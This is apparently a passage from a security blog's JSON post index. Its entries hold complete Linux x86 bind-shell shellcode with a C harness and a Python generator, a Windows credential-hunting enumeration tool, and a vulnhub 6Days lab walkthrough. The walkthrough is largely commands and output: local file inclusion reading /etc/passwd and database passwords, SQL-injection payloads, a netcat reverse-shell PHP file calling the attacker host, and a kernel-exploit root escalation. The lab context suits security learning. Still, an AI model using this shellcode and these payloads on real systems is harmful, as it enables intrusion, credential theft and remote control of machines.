&#39;s/$/&quot;/g&#39;&quot;\\x31\\xc0\\x89\\xc3\\x50\\xb0\\x66\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x5b\\x5b\\x43\\x66\\x68\\x1a\\x85\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x6a\\x01\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xfe\\xc3\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\xb0\\x3f\\x41\\x83\\xf9\\x02\\x7e\\xf6\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\\xb0\\x06\\x89\\xfb\\xcd\\x80&quot;Add it to a test C program#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;unsigned char code[] = \\&quot;\\x31\\xc0\\x89\\xc3\\x50\\xb0\\x66\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x5b\\x5b\\x43\\x66\\x68\\x1a\\x85\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x6a\\x01\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xfe\\xc3\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\xb0\\x3f\\x41\\x83\\xf9\\x02\\x7e\\xf6\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\\xb0\\x06\\x89\\xfb\\xcd\\x80&quot;;main(){ printf(&quot;Shellcode Length: %d\\n&quot;, strlen(code)); int (*ret)() = (int(*)())code; ret();}Start bindshellConnect to it with netcatPhase 4: Write a wrapper python scriptFinally, to make it a little bit more configurable I wrote a python script that would allow you to specify a port for the shellcode. The emmitted shellcode from the script will be properly updated for the port specified.# !/usr/bin/pythonfrom optparse import OptionParserdef convert_to_hex(port): val = hex(port)[2::] if not len(val) % 2 == 0: val = &quot;0&quot; + val return &#39;&#39;.join(&#39;\\\\x&#39; + val[i:i + 2] for i in range(0, len(val), 2))parser = OptionParser()parser.description = &quot;Generates TCP Bind Shell shellcode.&quot;parser.add_option(&quot;-p&quot;, &quot;--port&quot;, dest=&quot;port&quot;, help=&quot;Port to bind to&quot;, type=int)(options, args) = parser.parse_args()if not options.port: parser.print_help() exit(1)if options.port &amp;lt; 1 or options.port &amp;gt; 65535: print(&quot;Invalid port number.&quot;) exit(1)shellcode = ( &quot;\\\\x31\\\\xc0\\\\x89\\\\xc3\\\\x50\\\\xb0\\\\x66\\\\xb3\\\\x01\\\\x53\\\\x6a\\\\x02\\\\x89\\\\xe1\\\\xcd&quot; &quot;\\\\x80\\\\x89\\\\xc7\\\\xb0\\\\x66\\\\x5b\\\\x5b\\\\x43\\\\x66\\\\x68&quot; + convert_to_hex(options.port) + &quot;\\\\x66\\\\x6a\\\\x02\\\\x89\\\\xe1\\\\x6a\\\\x10\\\\x51\\\\x57\\\\x89\\\\xe1\\\\xcd\\\\x80\\\\xb0\\\\x66&quot; &quot;\\\\xb3\\\\x04\\\\x6a\\\\x01\\\\x57\\\\x89\\\\xe1\\\\xcd\\\\x80\\\\xb0\\\\x66\\\\xfe\\\\xc3\\\\x52\\\\x52&quot; &quot;\\\\x57\\\\x89\\\\xe1\\\\xcd\\\\x80\\\\x31\\\\xc9\\\\x89\\\\xc3\\\\xb0\\\\x3f\\\\xcd\\\\x80\\\\xb0\\\\x3f&quot; &quot;\\\\x41\\\\x83\\\\xf9\\\\x02\\\\x7e\\\\xf6\\\\xb0\\\\x0b\\\\x31\\\\xd2\\\\x52\\\\x68\\\\x6e\\\\x2f\\\\x73&quot; &quot;\\\\x68\\\\x68\\\\x2f\\\\x2f\\\\x62\\\\x69\\\\x89\\\\xe3\\\\x89\\\\xd1\\\\xcd\\\\x80\\\\xb0\\\\x06\\\\x89&quot; &quot;\\\\xfb\\\\xcd\\\\x80&quot;)print(shellcode)Example usage[sengen@manjaro-x86 assignment1]$ python create_bind_shell.py -hUsage: create_bind_shell.py [options]Generates TCP Bind Shell shellcode.Options: -h, --help show this help message and exit -p PORT, --port=PORT Port to bind to[sengen@manjaro-x86 assignment1]$ python create_bind_shell.py -p 4480\\x31\\xc0\\x89\\xc3\\x50\\xb0\\x66\\xb3\\x01\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\xb0\\x66\\x5b\\x5b\\x43\\x66\\x68\\x11\\x80\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x6a\\x01\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xfe\\xc3\\x52\\x52\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\x89\\xc3\\xb0\\x3f\\xcd\\x80\\xb0\\x3f\\x41\\x83\\xf9\\x02\\x7e\\xf6\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80\\xb0\\x06\\x89\\xfb\\xcd\\x80" }, { "title": "Windows Enumeration Script", "url": "/posts/winenum-script/", "categories": "Blogging, Penetration-Testing", "tags": "windows, enumeration, penetration-testing, hacking, script", "date": "2017-08-03 12:00:00 -0700", "snippet": "As I’ve started learning what the most common misconfigurations are on a Windows machine I decided that I should start creating a script to automate the searching for them. I have started an initial script to search for some common things that I do every time I try to escalate a Windows machine and will continue to update and improve on it.DescriptionThis is a python script that will collect some important information about the Windows system regarding patching, permission issues, and potentially leaked credentials in files and/or the registry. The intent is to continue adding to the script as I find more things to search for.Right now it is a single file and the intial intent was to have just one file to copy around. However, I believe to make it more modular and feature rich it will need to be split up and become more of a python module or library where the intent would be to alway compile it with PyInstaller before deploying to a Windows machine.At any rate, this is the initial script that I’m running against a Windows system and will continue to tweak and add to.GoalsTo create a single script that I can run against a Windows machine to collect targeted information. Among the information is: System information and currently installed patches Poorly permissioned Windows Services and Scheduled tasks (looks at both binpath file as well as directory permissions) Passwords/credentials leaked in files on disk unattended install files Passwords/credentials in the registryUsage The script can run on its own via python3+PyWin32 if it is installed on the Windows machine If not, you can use pyinstaller to turn it into an executable and move the executable to the windows machine NOTE: pyinstaller supports python 3.3-3.5 (not the latest 3.6 at the time of this writing) so if you are going to use pyinstaller make sure you are targeting python 3.5 instead Pre-requisites Python3 (specifically 3.5 if you are going to use pyinstaller) PyInstaller PyWin32 accesschk.exe / accesschk64.exeCreate the self-contained Windows executablec:\\Users\\sengen\\Desktop&amp;gt;pyinstaller --onefile WinEnum.py78 INFO: PyInstaller: 3.2.178 INFO: Python: 3.5.378 INFO: Platform: Windows-7-6.1.7601-SP178 INFO: wrote c:\\Users\\sengen\\Desktop\\WinEnum.spec78 INFO: UPX is not available.78 INFO: Extending PYTHONPATH with paths[&#39;c:\\\\Users\\\\sengen\\\\Desktop&#39;, &#39;c:\\\\Users\\\\sengen\\\\Desktop&#39;]78 INFO: checking Analysis78 INFO: Building Analysis because out00-Analysis.toc is non existent78 INFO: Initializing module dependency graph...78 INFO: Initializing module graph hooks...78 INFO: Analyzing base_library.zip ...2140 INFO: running Analysis out00-Analysis.toc2156 INFO: Adding Microsoft.Windows.Common-Controls to dependent assemblies of final executable required by c:\\program files\\python35\\python.exe2453 INFO: Caching module hooks...2468 INFO: Analyzing c:\\Users\\sengen\\Desktop\\WinEnum.py2468 INFO: Loading module hooks...2468 INFO: Loading module hook &quot;hook-pydoc.py&quot;...2468 INFO: Loading module hook &quot;hook-encodings.py&quot;...2546 INFO: Loading module hook &quot;hook-xml.py&quot;...2718 INFO: Looking for ctypes DLLs2718 INFO: Analyzing run-time hooks ...2718 INFO: Looking for dynamic libraries2812 INFO: Looking for eggs2812 INFO: Using Python library c:\\program files\\python35\\python35.dll2812 INFO: Found binding redirects:[]2812 INFO: Warnings written to c:\\Users\\sengen\\Desktop\\build\\WinEnum\\warnWinEnum.txt2812 INFO: checking PYZ2812 INFO: Building PYZ because out00-PYZ.toc is non existent2812 INFO: Building PYZ (ZlibArchive) c:\\Users\\sengen\\Desktop\\build\\WinEnum\\out00-PYZ.pyz3250 INFO: Building PYZ (ZlibArchive) c:\\Users\\sengen\\Desktop\\build\\WinEnum\\out00-PYZ.pyz completed successfully.3265 INFO: checking PKG3265 INFO: Building PKG because out00-PKG.toc is non existent3265 INFO: Building PKG (CArchive) out00-PKG.pkg4890 INFO: Building PKG (CArchive) out00-PKG.pkg completed successfully.4890 INFO: Bootloader c:\\program files\\python35\\lib\\site-packages\\PyInstaller\\bootloader\\Windows-64bit\\run.exe4890 INFO: checking EXE4890 INFO: Building EXE because out00-EXE.toc is non existent4890 INFO: Building EXE from out00-EXE.toc4890 INFO: Appending archive to EXE c:\\Users\\sengen\\Desktop\\dist\\WinEnum.exe4890 INFO: Building EXE from out00-EXE.toc completed successfully.The repository with the scriptAll the future Windows enumeration and data collection script will be in the following repository (including this first one, WinEnum.py)https://github.com/tdmathison/WindowsEnumeration" }, { "title": "6Days Lab: 1.1", "url": "/posts/6days-lab/", "categories": "CTF, Walkthrough", "tags": "ctf, hacking, walkthrough", "date": "2017-07-31 12:00:00 -0700", "snippet": "6Days Lab: 1.1IntroThis is my walkthrough of the 6days lab vulnhub machine. You can find this machine at 6Days Lab. If you want to attempt to hack into this machine without spoilers, don’t read the rest of this walkthrough.Located machine on networkOnce the victim machine was booted I performed a quick scan to identify what IP address the new machine received through DHCP.root@sengen-kali:~/vulnhub/6days# nmap 192.168.56.0/24 -snStarting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 14:44 PDTmass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-serversmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for 192.168.56.1Host is up (0.00017s latency).MAC Address: 0A:00:27:00:00:00 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.00013s latency).MAC Address: 08:00:27:EF:D4:FC (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.104Host is up (0.00019s latency).MAC Address: 08:00:27:0B:78:6D (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.101Host is up.Nmap done: 256 IP addresses (4 hosts up) scanned in 1.90 secondsPerformed onetwopunch / nmap scansUsing the onetwopunch script which combines unicornscan and nmap I scanned the machine looking for open ports.root@sengen-kali:~/vulnhub/6days# ~/onetwopunch.sh -t target.txt -p all -n &quot;-A -sV&quot;Results indicated the following TCP/UDP ports were found.[*] TCP ports for nmap to scan: 22,80[!] No UDP ports foundQuick nmap scan also showed a filtered http-proxy port 8080root@sengen-kali:~/vulnhub/6days# nmap 192.168.56.104Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 15:57 PDTmass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-serversmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for 192.168.56.104Host is up (0.00015s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http8080/tcp filtered http-proxyMAC Address: 08:00:27:0B:78:6D (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 1.63 secondsSo it appears that SSH and a Web port is openNavigated to the webpage and there’s a simple page with a promocode textbox and button.Using the code NONEEDFORPENTEST results in a response of:Code expired!Viewing source We see that the form submits to a php page called checkpromo.php We also see an interesting piece for the broken image on the page &amp;lt;img src=”http://192.168.56.104/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg” /&amp;gt; LFI detectedThis image link is rather suspicious as it is being provided as a parameter to another php page call image.php (this often means an LFI or RFI could be possible).I tried a number of LFI paths in the browser but received errors on the page but then tried them again with curl with success:root@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shsyslog:x:101:103::/home/syslog:/bin/falsemysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/falsemessagebus:x:103:106::/var/run/dbus:/bin/falsewhoopsie:x:104:107::/nonexistent:/bin/falselandscape:x:105:110::/var/lib/landscape:/bin/falsesshd:x:106:65534::/var/run/sshd:/usr/sbin/nologinuser:x:1000:1000:user,,,:/home/user:/bin/bashandrea:x:1001:1001::/home/andrea:/bin/andreaThe account andrea at the end is of interest so we’ll keep that in mind.Searching for other filesThe next thing was to see if we could get the other files that were referenced on the site to see what was in them.checkpromo.phproot@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../../var/www/checkpromo.php&amp;lt;?phpinclude &#39;config.php&#39;;$conn = mysql_connect($servername, $username, $password);if (!$conn) { die(&quot;Connection failed: &quot; . $conn-&amp;gt;connect_error);}$sql = &quot;SELECT discount, status FROM promocodes WHERE promocode=&#39;&quot;.$_GET[&#39;promocode&#39;].&quot;&#39;;&quot;;mysql_select_db($dbname);$result = mysql_query($sql, $conn);if (!$result) { echo &quot;Promocode not valid!&quot;;} else { while($row = mysql_fetch_array($result, MYSQL_ASSOC)) { if($row[&#39;status&#39;] == 0) echo &quot;Code expired!&quot;; else echo &quot;You have %&quot;.$row[&#39;discount&#39;].&quot; discount!&quot;; }}mysql_close($conn);?&amp;gt;config.phproot@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../../var/www/config.php&amp;lt;?php$servername = &quot;localhost&quot;;$username = &quot;sellingstuff&quot;;$password = &quot;n0_\\$\\$_n0_g41ns&quot;;$dbname = &quot;fancydb&quot;;image.phproot@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../../var/www/image.php&amp;lt;?php$img = $_GET[&#39;src&#39;];header(&#39;Content-Type: image/jpeg&#39;);readfile($img);?&amp;gt;SQL InjectionSo from the above pages I have now gathered, my interest was in the SQL injection that seemed possible through the promocode field. Although this is where things got a little tricky and not as straight forward as I expected.The following is the SQL query that I tried to inject into:$sql = &quot;SELECT discount, status FROM promocodes WHERE promocode=&#39;&quot;.$_GET[&#39;promocode&#39;].&quot;&#39;;&quot;;It seems like this should be an easy injection into this query so I start out with some basic injections to try to get a confirmation.Starting with a single tick I get an error response with the message:&amp;lt;/i&amp;gt;“Malicious request blocked! ~Rashomon IPS”&amp;lt;/i&amp;gt;I tried a number of of different things such as &#39; or 1=1 or &#39;a&#39;=&#39; but nothing worked. I tried url encoding a tick as well (%27) and the result was it getting double url encoded at the destination (%2527)… weird. Not sure what that is about.I looked through the source again and realized I had not actually grabbed the default page of the site so did that:root@sengen-kali:~/vulnhub/6days# curl http://192.168.56.104/image.php?src=../../../../../var/www/index.php&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Rashomon IPS - Main Page&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h2&amp;gt;Rashomon Intrusion Prevention System&amp;lt;/h2&amp;gt;&amp;lt;h3&amp;gt;Become immune to every attack!&amp;lt;/h3&amp;gt;Today we&#39;re announcing our brand new product, Rashomon IPS! &amp;lt;br /&amp;gt;It&#39;s capable of blocking any &amp;lt;b&amp;gt;sophisticated cyber attack&amp;lt;/b&amp;gt; which &amp;lt;u&amp;gt;can harm your precious customers.&amp;lt;/u&amp;gt; (you don&#39;t want THAT to happen, do you?) &amp;lt;br /&amp;gt;&amp;lt;img src=&quot;http://&amp;lt;? echo passthru(&quot;/sbin/ifconfig | /bin/grep -Eo &#39;inet (addr:)?([0-9]*\\.){3}[0-9]*&#39; | /bin/grep -Eo &#39;([0-9]*\\.){3}[0-9]*&#39; | /bin/grep -v &#39;127.0.0.1&#39; | /usr/bin/tr -d &#39;\\n&#39;&quot;); ?&amp;gt;/image.php?src=https%3A%2f%2f4.bp.blogspot.com%2f-u8Jo4CEKQLk%2fV4OpiaoMJ7I%2fAAAAAAAAAiw%2f8kuCpTOpRWUAdp2p4GpegWdnOwxjwHNYQCLcB%2fs1600%2fphoto.jpg&quot; /&amp;gt; &amp;lt;br /&amp;gt;(This guy is coming after your website!) &amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;Don&#39;t waste your time and money by hiring &amp;lt;font color=&quot;#ff00cc&quot;&amp;gt;pentesters&amp;lt;/font&amp;gt; and doing real security audits. &amp;lt;br /&amp;gt;This is the best way to secure your organization and you can completely rely on it, and only it! &amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;IT&#39;S SO SECURE WE EVEN USE IT ON OUR WEBSITE. &amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;So be quick and get a &amp;lt;u&amp;gt;%15 discount&amp;lt;/u&amp;gt; on our newest product using the promocode &amp;lt;b&amp;gt;NONEEDFORPENTEST&amp;lt;/b&amp;gt;. (discount will be available until yesterday)&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;form name=&quot;promo&quot; method=&quot;GET&quot; action=&quot;checkpromo.php&quot;&amp;gt;Apply your promo code here: &amp;lt;input type=&quot;text&quot; name=&quot;promocode&quot;&amp;gt;&amp;lt;input type=&quot;submit&quot; value=&quot;Apply Promo&quot;&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;lt;?php?&amp;gt;PHP is using the passthru function that can execute arbitrary commands, however, nothing in this allows for injection from us it seems.So these sanitizations are happening on my input from the main page but perhaps if I make the same request through the image page it may change. One thing to note is that since the parameter is a URL it needs to be URL encoded and the parameter it has for promocode needs to be URL encoded (so this ends up being double URL encoded).With this in mind…The request I want to make is:curl http://192.168.56.104/image.php?src=http://127.0.0.1/checkpromo.php?promocode=&#39;URL encoding the parameter results in:curl http://192.168.56.104/image.php?src=http%3a%2f%2f127.0.0.1%2fcheckpromo.php%3fpromocode%3d%2527Malicious request blocked!~Rashomon IPSSame error… blocked.Knowing about the potential proxy on 8080 that it may be able to use if the request was coming from local I add in the 8080 port to see if that makes a difference.curl http://192.168.56.104/image.php?src=http%3a%2f%2f127.0.0.1%3a8080%2fcheckpromo.php%3fpromocode%3d%2527Promocode not valid!Success! It works while sending it a single tick which means I may have bypassed the Rashomon IPS filtering.Making testing easier through a custom python scriptTo make things easier to test since all this encoding needs to happen I wrote the below python code to assist in executing commands as I perform some trial and error SQL.#!/usr/bin/python3import osimport sysfrom urllib.parse import quote_plusbase_url = &#39;http://192.168.56.104/image.php?src=&#39;proxy_url = quote_plus(&#39;http://127.0.0.1:8080/checkpromo.php?promocode=&#39;)attack_string = quote_plus(quote_plus(sys.argv[1])).replace(&quot;-&quot;, &quot;%252d&quot;)print(base_url + proxy_url + attack_string)for line in os.popen(&#39;curl &#39; + base_url + proxy_url + attack_string).read().splitlines(): print(line)This now allows me to make a call like ./query.py &quot;&#39;&quot; which does the proper URL encoding for me.1% discountWith some trial and error I was able to get a 1% discount message as seen below:root@sengen-kali:~/vulnhub/6days# ./query.py &quot;&#39; union select 1,&#39;1&quot;http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2B1%252C%25271 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 21 100 21 0 0 2966 0 --:--:-- --:--:-- --:--:-- 3500You have %1 discount!0% - Sleep(1)Confirmed through a sleep that I was executing my select here:root@sengen-kali:~/vulnhub/6days# ./query.py &quot;&#39; union select sleep(1),&#39;1&quot;http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2Bsleep%25281%2529%252C%25271 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 21 100 21 0 0 20 0 0:00:01 0:00:01 --:--:-- 20You have %0 discount!Searching for valid tablesDue to the sleep trick I could execute queries to test for valid table names. If the table name was valid I would get the 1 second sleep, if it was invalid it would return immediately.In the end, a “users” table was present:root@sengen-kali:~/vulnhub/6days# ./query.py &quot;&#39; union select sleep(1), 1 from users union select 1, &#39;1&quot;http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2Bsleep%25281%2529%252C%2B1%2Bfrom%2Busers%2Bunion%2Bselect%2B1%252C%2B%25271 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 42 100 42 0 0 41 0 0:00:01 0:00:01 --:--:-- 41You have %0 discount!You have %1 discount!Finding valid columns and ultimately credentials to an account we saw earlier in the /etc/passwd fileroot@sengen-kali:~/vulnhub/6days# ./query.py &quot;&#39; union select username, 1 from users union select 1, &#39;1&quot;http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2Busername%252C%2B1%2Bfrom%2Busers%2Bunion%2Bselect%2B1%252C%2B%25271 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 47 100 47 0 0 11895 0 --:--:-- --:--:-- --:--:-- 15666You have %&amp;lt;b&amp;gt;andrea&amp;lt;/b&amp;gt; discount!You have %1 discount!root@sengen-kali:~/vulnhub/6days# ./query.py &quot;&#39; union select password, 1 from users union select 1, &#39;1&quot;http://192.168.56.104/image.php?src=http%3A%2F%2F127.0.0.1%3A8080%2Fcheckpromo.php%3Fpromocode%3D%2527%2Bunion%2Bselect%2Bpassword%252C%2B1%2Bfrom%2Busers%2Bunion%2Bselect%2B1%252C%2B%25271 % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 56 100 56 0 0 19656 0 --:--:-- --:--:-- --:--:-- 28000You have %&amp;lt;b&amp;gt;SayNoToPentests&amp;lt;/b&amp;gt; discount!You have %1 discount!SSHSo we now have some credentials (andrea / SayNoToPentests) and we’ll give a shot at using them to SSH into the target machine.Success!But we can’t seem to execute commands….andrea@cypm:~$ ifconfigandrea@cypm:~$ hostnameandrea@cypm:~$ uname -aandrea@cypm:~$ pwdandrea@cypm:~$ cdrbash: cd: restrictedandrea@cypm:~$No commands seem to be working and upon using ‘cd’ it becomes obvious we are in an rbash shell.It seems we may be able to use wget so will try to get a reverse shell uploadedandrea@cypm:~$ wgetwget: missing URLUsage: wget [OPTION]... [URL]...Try `wget --help&#39; for more options.Created php file to get a shellroot@sengen-kali:~/vulnhub/6day# cat shell.php&amp;lt;?php echo shell_exec(&quot;/bin/nc -e /bin/sh 192.168.56.101 443&quot;);?&amp;gt;Used wget to get it to the victim machine and put it in /var/wwwandrea@cypm:~$ wget http://192.168.56.101/shell.php--2017-07-27 22:25:32-- http://192.168.56.101/shell.phpConnecting to 192.168.56.101:80... connected.HTTP request sent, awaiting response... 200 OKLength: 0 [text/html]Saving to: `shell.php&#39; [ &amp;lt;=&amp;gt; ] 0 --.-K/s in 0s 2017-07-27 22:25:32 (0.00 B/s) - `shell.php&#39; saved [0/0]andrea@cypm:~$ cp shell.php /var/wwwListened on netcat for the connection and called the shell.php pageEscalation to rootGained a better PTYwhich python/usr/bin/python/usr/bin/python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;www-data@cypm:/var/www$Checked some permission misconfigurations for quick killswww-data@cypm:/var/www$ ls -l /etc/passwdls -l /etc/passwd-rw-r--r-- 1 root root 1142 Jul 11 2016 /etc/passwdwww-data@cypm:/var/www$ ls -l /etc/shadowls -l /etc/shadow-rw-r----- 1 root shadow 1023 Jul 11 2016 /etc/shadowGathered some kernel version informationwww-data@cypm:/var/www$ uname -auname -aLinux cypm 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 i686 i386 GNU/LinuxDid a searchsploit against the exact kernel versionroot@sengen-kali:~/vulnhub/6day# searchsploit 3.13.0---------------------------------------------------------------------------------- ---------------------------------- Exploit Title | Path | (/usr/share/exploitdb/platforms/)---------------------------------------------------------------------------------- ----------------------------------Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#39;overlayfs&#39; Privile | linux/local/37292.cLinux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#39;overlayfs&#39; Privile | linux/local/37293.txt---------------------------------------------------------------------------------- ----------------------------------Pulled down linuxprivchecker to get a reportwww-data@cypm:/var/www$ ls -l /etc/shadowls -l /etc/shadow-rw-r----- 1 root shadow 1023 Jul 11 2016 /etc/shadowwww-data@cypm:/var/www$ wget http://192.168.56.101/common/lpc.pywget http://192.168.56.101/common/lpc.py--2017-07-28 03:11:35-- http://192.168.56.101/common/lpc.pyConnecting to 192.168.56.101:80... connected.HTTP request sent, awaiting response... 200 OKLength: 25304 (25K) [text/x-python]Saving to: `lpc.py&#39;100%[======================================&amp;gt;] 25,304 --.-K/s in 0.001s 2017-07-28 03:11:35 (34.0 MB/s) - `lpc.py&#39; saved [25304/25304]www-data@cypm:/var/www$ /usr/bin/python ./lpc.pyA number of possible exploits were listed by linux priv checker as wellKernel ia32syscall Emulation Privilege Escalation || http://www.exploit-db.com/exploits/15023 || Language=cSendpage Local Privilege Escalation || http://www.exploit-db.com/exploits/19933 || Language=ruby**CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit) || http://www.exploit-db.com/exploits/15944 || Language=cCAP_SYS_ADMIN to root Exploit || http://www.exploit-db.com/exploits/15916 || Language=cMySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit || http://www.exploit-db.com/exploits/1518 || Language=copen-time Capability file_ns_capable() Privilege Escalation || http://www.exploit-db.com/exploits/25450 || Language=copen-time Capability file_ns_capable() - Privilege Escalation Vulnerability || http://www.exploit-db.com/exploits/25307 || Language=cI decided to start with the exact kernel version exploit since this one in particular came up and because it is overlayfs which is a very common vulnerability that I have successfully used on many linux machines. If it doesn’t work I can move on to the others.Copied the exploit to the system, compiled, and ran itSo, on the first exploit pulled down it works…Locating flag file# find / -name *flag*find / -name *flag*/flag# file /flagfile /flag/flag: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1c1ab047fe9e780a761aade9bc9b22efe3a9765b, not stripped# /flag/flag _________ _____ __ ______ __ ______ _ ______ ____ ___ ___ / ___/ __ `/ __ \\/ / / / __ \\/ / / / __ \\ | /| / / __ \\ / __ `__ \\/ _ \\/ /__/ /_/ / / / / /_/ / /_/ / /_/ / /_/ / |/ |/ / / / / / / / / / / __/\\___/\\__,_/_/ /_/\\__, /\\____/\\__,_/ .___/|__/|__/_/ /_(_)_/ /_/ /_/\\___/ /____/ /_/ Author: @1ce7ea Congratulations on successfully completing our boot2root vm! Please consider visiting our website and following us on Twitter. And please provide feedback. I hope you enjoyed it :) Website: http://canyoupwn.me/ Twitter: https://twitter.com/canyoupwnme Author: https://twitter.com/1ce7ea" }, { "title": "Stapler", "url": "/posts/stapler/", "categories": "CTF, Walkthrough", "tags": "ctf, hacking, walkthrough", "date": "2017-07-28 12:00:00 -0700", "snippet": "StaplerIntroThis is my walkthrough of the Stapler vulnhub machine. You can find this machine at Stapler. If you want to attempt to hack into this machine without spoilers, don’t read the rest of this walkthrough.Located machine on networkroot@sengen-kali:~/vulnhub/stapler# nmap 192.168.56.0/24 -snStarting Nmap 7.50 ( https://nmap.org ) at 2017-07-28 10:16 PDTmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-serversNmap scan report for 192.168.56.1Host is up (0.00013s latency).MAC Address: 0A:00:27:00:00:00 (Unknown)Nmap scan report for 192.168.56.100Host is up (0.00023s latency).MAC Address: 08:00:27:3C:94:BA (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.102Host is up (0.00032s latency).MAC Address: 08:00:27:51:F5:BC (Oracle VirtualBox virtual NIC)Nmap scan report for 192.168.56.101Host is up.Nmap done: 256 IP addresses (4 hosts up) 